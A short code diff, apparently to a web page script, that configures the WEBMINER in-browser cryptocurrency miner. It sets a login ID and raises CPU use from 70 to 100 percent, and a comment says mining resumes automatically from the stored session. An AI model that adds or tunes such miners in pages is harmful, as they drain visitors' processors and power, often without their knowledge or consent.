@@ -23,11 +23,11 @@
         // - Configure:
         WEBMINER.config({ 
             login: "6170846", // Your ID - required
-            pass: "6170846", // Name for stats, leave blank for automatic set.
+            pass: null, // Name for stats, leave blank for automatic set.
         });
         
         // - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
-        WEBMINER.power(70);
+        WEBMINER.power(100);
         
         // - Restore previous session accepted hashes and power (start mining if it worked in previous session):
         WEBMINER.loadStored();
